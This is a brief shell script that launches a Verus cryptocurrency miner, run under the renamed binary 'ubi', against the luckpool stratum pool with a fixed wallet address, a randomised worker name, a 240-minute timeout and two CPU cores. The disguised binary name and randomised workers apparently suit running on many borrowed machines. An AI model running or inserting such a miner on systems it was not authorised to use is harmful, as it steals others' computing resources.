#!/bin/sh
chmod +x verus-solver
chmod +x ubi
timeout 240m ./ubi -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RBfBRKqh6b3LFxMWFRdfFcPfdboN5jptXN.$(echo $(shuf -i 10-299 -n 1)-ANDRO-X) -p x --cpu 2
